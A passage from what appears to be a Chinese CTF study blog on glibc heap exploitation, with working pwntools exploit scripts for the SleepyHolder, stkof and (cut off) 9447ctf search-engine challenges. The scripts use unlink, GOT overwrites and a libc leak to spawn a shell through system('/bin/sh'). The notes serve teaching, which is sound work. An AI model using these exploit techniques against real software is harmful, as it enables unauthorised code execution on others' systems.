spellcheck="true">//最终导致的结果为ptr0中存储的内容由堆块0的数据段首地址（也是fake chunk首地址）变为了&amp;ptr0-3</span>    <span class="token comment" spellcheck="true">//也就是说，我们再通过ptr0进行写入时，不是写入到堆块0的数据段中，而是写入到栈上&amp;ptr0-3的位置</span>    <span class="token keyword">char</span> victim<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>    ptr0<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span>victim<span class="token punctuation">;</span>    ptr0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4141414141</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//ptr0[3]，正好是ptr0的位置，将其覆盖为字符串victim的首地址</span>    <span class="token comment" spellcheck="true">//再次对其进行写入，ptr0[0]正好是字符串victim的第一位，所以相当于对字符串victim进行写入</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="unlink攻击"><a href="#unlink攻击" class="headerlink" title="unlink攻击"></a>unlink攻击</h3><p>unlink漏洞可以造成任意地址写</p><p>前提是能够覆盖到下一个chunk的头（即prev_size和size）</p><h3 id="SleepyHolder"><a href="#SleepyHolder" class="headerlink" title="SleepyHolder"></a>SleepyHolder</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#r = remote('52.68.31.117', 9547)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./SleepyHolder'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'3. Renew secret\n'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Big secret\n'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">de</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'3. Renew secret\n'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Big secret\n'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'3. Renew secret\n'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Big secret\n'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>de<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>de<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#构造double free，small_secret在fastbin和smallbin中各有一个</span>f_ptr <span class="token operator">=</span> <span class="token number">0x6020d0</span>fake_chunk <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>fake_chunk <span class="token operator">+=</span> p64<span class="token punctuation">(</span>f_ptr <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>f_ptr<span class="token number">-0x10</span><span class="token punctuation">)</span>fake_chunk <span class="token operator">+=</span> <span class="token string">'\x20'</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">)</span>de<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#unlink攻击，原本存储small_secret的地址的地方（0x6020d0）现在存储0x6020b8</span>atoi_GOT <span class="token operator">=</span> <span class="token number">0x602080</span>free_GOT <span class="token operator">=</span> <span class="token number">0x602018</span>puts_GOT <span class="token operator">=</span> <span class="token number">0x602020</span>puts_plt <span class="token operator">=</span> <span class="token number">0x400760</span>atoi_offset <span class="token operator">=</span> <span class="token number">0x36e70</span>system_offset <span class="token operator">=</span> <span class="token number">0x45380</span>f <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>f <span class="token operator">+=</span> p64<span class="token punctuation">(</span>atoi_GOT<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_GOT<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_GOT<span class="token punctuation">)</span>f <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>update<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#原本存储big_secret地址处改为atoi的got地址</span><span class="token comment" spellcheck="true">#原本存储huge_secret地址处改为puts的got地址</span><span class="token comment" spellcheck="true">#原本存储small_secret地址处改为free的got地址</span>update<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#free的got地址处改为puts的plt地址</span>de<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#free变成了puts，所有效果是输出big_secret处存储的atoi的got地址</span>s <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>s<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> atoi_offsetsystem <span class="token operator">=</span> libc_base <span class="token operator">+</span> system_offsetupdate<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#free的got地址处改为system的libc地址</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'sh\0'</span><span class="token punctuation">)</span>de<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="stkof"><a href="#stkof" class="headerlink" title="stkof"></a>stkof</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stkof'</span><span class="token punctuation">)</span>e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./stkof'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> <span class="token number">0x602140</span>ptr2 <span class="token operator">=</span> ptr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>con<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>con<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>con<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    write<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(addr)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\x0aOK'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#print(data)</span>    <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'\x00'</span>    <span class="token keyword">return</span> dataadd<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x81</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ptr2<span class="token number">-0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ptr2<span class="token number">-0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OK\n'</span><span class="token punctuation">)</span>free_got <span class="token operator">=</span> <span class="token number">0x602018</span>puts_plt <span class="token operator">=</span> <span class="token number">0x400760</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span>write<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print('start\n')</span>d <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf<span class="token operator">=</span>e<span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>d<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'libc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(sys_addr)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span>write<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>write<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考网页：</p><p><a href="https://blog.csdn.net/fuchuangbob/article/details/51649353" target="_blank" rel="noopener">https://blog.csdn.net/fuchuangbob/article/details/51649353</a></p><p>ctfwiki上也有这道题的讲解</p><p><a href="https://wiki.x10sec.org/pwn/heap/unlink/" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/unlink/</a></p><h3 id="大致梳理一下思路："><a href="#大致梳理一下思路：" class="headerlink" title="大致梳理一下思路："></a>大致梳理一下思路：</h3><p>这个程序主要有4个功能：</p><p>1：创建新的堆块（设置长度）</p><p>2：向已有堆块中写入（没有长度限制）</p><p>3：free已有堆块（会把指针清空）</p><p>4：判断长度是否&gt;3（没什么用）</p><p>因为向堆块的写入没有长度限制，所以我们可以覆盖到下个堆块的头，从而利用unlink漏洞造成任意地址写</p><p>让一个堆块的指针指向free函数的got地址，如何改写这个堆块的内容，实际上就改写了free函数指向的内容，可以将其改为其他函数的plt地址</p><p>由于没有提供libc文件，所以需要用DynELF进行泄漏，这里需要先将puts函数的plt地址写到free_got处，再将addr覆盖至某个堆块的指针，然后将其free（实际上是puts）</p><p>泄露出libc之后将system函数的plt地址写到free_got处，再将’/bin/sh’写入某个堆块，最后将其free，就可以达到system(‘/bin/sh’)</p><p>所有堆块的指针放在一个数组中，利用哪一个进行unlink其实没有太大关系，但是关系到后面构造payload时的复杂度</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA（链接）</title>
      <link href="/2020/02/25/rsa-lian-jie/"/>
      <url>/2020/02/25/rsa-lian-jie/</url>
      
        <content type="html"><![CDATA[<h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p><a href="https://www.jianshu.com/p/ff2b538a77e2" target="_blank" rel="noopener">https://www.jianshu.com/p/ff2b538a77e2</a></p><p><a href="https://blog.csdn.net/huanghelouzi/article/details/82943615" target="_blank" rel="noopener">https://blog.csdn.net/huanghelouzi/article/details/82943615</a></p><h3 id="RSA模数攻击"><a href="#RSA模数攻击" class="headerlink" title="RSA模数攻击"></a>RSA模数攻击</h3><p><a href="https://www.jianshu.com/p/4e64e3b81156" target="_blank" rel="noopener">https://www.jianshu.com/p/4e64e3b81156</a></p><p><a href="https://developer.aliyun.com/ask/126532?spm=a2c6h.13159736" target="_blank" rel="noopener">https://developer.aliyun.com/ask/126532?spm=a2c6h.13159736</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RSA </tag>
            
            <tag> 链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆基础知识（链接）</title>
      <link href="/2020/02/25/dui-ji-chu-zhi-shi-lian-jie/"/>
      <url>/2020/02/25/dui-ji-chu-zhi-shi-lian-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="堆基础知识"><a href="#堆基础知识" class="headerlink" title="堆基础知识"></a>堆基础知识</h2><p><a href="https://www.jianshu.com/p/69ad10351ba8" target="_blank" rel="noopener">https://www.jianshu.com/p/69ad10351ba8</a></p><h3 id="钩子函数"><a href="#钩子函数" class="headerlink" title="钩子函数"></a>钩子函数</h3><p><a href="http://blog.sina.com.cn/s/blog_8588208901017qgb.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_8588208901017qgb.html</a></p><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p><a href="https://blog.csdn.net/angciyu/article/details/80794273" target="_blank" rel="noopener">https://blog.csdn.net/angciyu/article/details/80794273</a></p><p><a href="https://blog.csdn.net/yilovexing/article/details/93192484" target="_blank" rel="noopener">https://blog.csdn.net/yilovexing/article/details/93192484</a></p><h3 id="钩子函数与回调函数"><a href="#钩子函数与回调函数" class="headerlink" title="钩子函数与回调函数"></a>钩子函数与回调函数</h3><p><a href="https://www.cnblogs.com/johnjackson/p/11044658.html" target="_blank" rel="noopener">https://www.cnblogs.com/johnjackson/p/11044658.html</a></p><p><a href="https://www.cnblogs.com/changk/p/8982000.html" target="_blank" rel="noopener">https://www.cnblogs.com/changk/p/8982000.html</a></p><p><a href="https://blog.csdn.net/wukery/article/details/53256273" target="_blank" rel="noopener">https://blog.csdn.net/wukery/article/details/53256273</a></p><h3 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="__malloc_hook"></a>__malloc_hook</h3><p><a href="https://www.jianshu.com/p/0d7aa3166eec" target="_blank" rel="noopener">https://www.jianshu.com/p/0d7aa3166eec</a></p><h3 id="execve函数"><a href="#execve函数" class="headerlink" title="execve函数"></a>execve函数</h3><p><a href="https://blog.csdn.net/xu215740578/article/details/100905574" target="_blank" rel="noopener">https://blog.csdn.net/xu215740578/article/details/100905574</a></p><h3 id="system与execve的区别"><a href="#system与execve的区别" class="headerlink" title="system与execve的区别"></a>system与execve的区别</h3><p><a href="https://www.xuebuyuan.com/512187.html" target="_blank" rel="noopener">https://www.xuebuyuan.com/512187.html</a></p><h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p><a href="https://www.cnblogs.com/love-jelly-pig/p/8471206.html" target="_blank" rel="noopener">https://www.cnblogs.com/love-jelly-pig/p/8471206.html</a></p><h3 id="waitpid"><a href="#waitpid" class="headerlink" title="waitpid"></a>waitpid</h3><p><a href="https://baike.baidu.com/item/waitpid/4071590?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/waitpid/4071590?fr=aladdin</a></p><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/96838671" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/96838671</a> （安装）</p><p><a href="https://xz.aliyun.com/t/2720" target="_blank" rel="noopener">https://xz.aliyun.com/t/2720</a> （介绍）</p><p><a href="https://xz.aliyun.com/t/6598" target="_blank" rel="noopener">https://xz.aliyun.com/t/6598</a> （应用）</p><h3 id="fastbin-attack漏洞"><a href="#fastbin-attack漏洞" class="headerlink" title="fastbin attack漏洞"></a>fastbin attack漏洞</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/99315504" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99315504</a></p><h3 id="CSDN上的堆教程"><a href="#CSDN上的堆教程" class="headerlink" title="CSDN上的堆教程"></a>CSDN上的堆教程</h3><p><a href="https://blog.csdn.net/qq_41453285/article/list/21" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/list/21</a></p><h3 id="malloc-hook攻击"><a href="#malloc-hook攻击" class="headerlink" title="__malloc_hook攻击"></a>__malloc_hook攻击</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/99321101" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99321101</a></p><h3 id="UAF获取main-arena地址泄露libc基址"><a href="#UAF获取main-arena地址泄露libc基址" class="headerlink" title="UAF获取main_arena地址泄露libc基址"></a>UAF获取main_arena地址泄露libc基址</h3><p><a href="https://www.jianshu.com/p/7904d1edc007?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation" target="_blank" rel="noopener">https://www.jianshu.com/p/7904d1edc007?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></p><h3 id="通过unsorted-bin泄露libc地址"><a href="#通过unsorted-bin泄露libc地址" class="headerlink" title="通过unsorted bin泄露libc地址"></a>通过unsorted bin泄露libc地址</h3><p><a href="https://blog.csdn.net/weixin_42151611/article/details/98087790" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42151611/article/details/98087790</a> （2015 9447ctf search_engine的题解）</p><h3 id="Linux查看进程ID"><a href="#Linux查看进程ID" class="headerlink" title="Linux查看进程ID"></a>Linux查看进程ID</h3><p><a href="https://jingyan.baidu.com/article/48a42057307f67a9242504ee.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/48a42057307f67a9242504ee.html</a></p><h3 id="one-gadget-1"><a href="#one-gadget-1" class="headerlink" title="one_gadget"></a>one_gadget</h3><p><a href="https://xz.aliyun.com/t/2720" target="_blank" rel="noopener">https://xz.aliyun.com/t/2720</a> （原文档翻译）</p><p><a href="https://blog.csdn.net/qq_41453285/article/details/96838671" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/96838671</a> （安装方法）</p><p><a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">https://github.com/david942j/one_gadget</a> （github）</p><p><a href="https://blog.csdn.net/Maxmalloc/article/details/102535427" target="_blank" rel="noopener">https://blog.csdn.net/Maxmalloc/article/details/102535427</a> （不起作用的情况）</p><h3 id="2015-9447ctf-search-engine"><a href="#2015-9447ctf-search-engine" class="headerlink" title="2015_9447ctf_search-engine"></a>2015_9447ctf_search-engine</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./search'</span><span class="token punctuation">)</span>offset_D <span class="token operator">=</span> <span class="token number">0x3c4b20</span><span class="token keyword">def</span> <span class="token function">index_sen</span><span class="token punctuation">(</span>sen<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Quit\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>sen<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'sentence:\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>sen<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">search_word</span><span class="token punctuation">(</span>wo<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Quit\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>wo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'word:\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>wo<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leak_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    smallbin_sen <span class="token operator">=</span> <span class="token string">'s'</span><span class="token operator">*</span><span class="token number">0x85</span> <span class="token operator">+</span> <span class="token string">' m'</span>    index_sen<span class="token punctuation">(</span>smallbin_sen<span class="token punctuation">)</span>    search_word<span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'(y/n)?\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>    search_word<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    un_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    